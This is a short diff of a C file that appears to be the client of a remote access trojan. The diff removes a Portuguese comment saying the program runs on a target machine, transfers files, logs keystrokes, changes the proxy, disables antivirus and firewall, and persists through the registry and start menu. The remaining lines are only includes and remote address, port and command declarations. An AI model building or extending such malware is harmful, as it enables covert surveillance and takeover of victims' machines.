@@ -17,28 +17,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 */
 
-/*
-Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.
-
-Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.
-
-JÁ PRONTOS: desativar anti-virus e firewallro
-            copiar-se para o registro
-            copiar-se para o menu iniciar
-
-terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
-
-// use without abuse.
-
-// POC!
-
-// coder  mrx6s0
-
-DESSE MODO O CÓDIGO PASSA A SER COMPILADO PARA ASSEMBLY. 
-SALVAR! ############# PRESTAR ATENÇÃO AQUI!!! ##########
-
-*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
@@ -68,7 +46,7 @@ SALVAR! ############# PRESTAR ATENÇÃO AQUI!!! ##########
   char REMOTE_ADDR; /*remote_addr */
   int REMOTE_PORT; /* remote port */
   char commands[bytes];
-  int novax;
+  //int novax;
   int x;
   FILE *filecmd;
 
